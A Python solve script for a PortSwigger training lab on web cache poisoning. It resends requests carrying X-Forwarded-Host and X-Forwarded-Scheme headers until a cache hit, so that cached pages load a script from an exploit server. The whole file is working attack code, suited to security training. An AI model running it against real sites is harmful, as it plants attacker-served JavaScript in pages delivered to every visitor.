#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Web cache poisoning with multiple headers.

Sends GET / with both X-Forwarded-Host and X-Forwarded-Scheme until
X-Cache: hit, poisoning the cached script import URL.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning Lab 3 (multiple headers)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("exploit_host", help="Exploit server hostname (no https://)")
    parser.add_argument("--max-attempts", type=int, default=20)
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    headers = {
        "X-Forwarded-Host": args.exploit_host,
        "X-Forwarded-Scheme": "http",
    }

    print(f"[*] Poisoning with X-Forwarded-Host={args.exploit_host} + X-Forwarded-Scheme=http")
    for i in range(1, args.max_attempts + 1):
        r = s.get(f"{lab}/", headers=headers)
        cache_status = r.headers.get("X-Cache", "none")
        print(f"[{i}] X-Cache: {cache_status}")
        if cache_status == "hit":
            print(f"[+] Cache poisoned! Ensure {args.exploit_host}/resources/js/tracking.js serves your payload.")
            return

    print("[-] Cache hit not observed — try more attempts.")


if __name__ == "__main__":
    main()
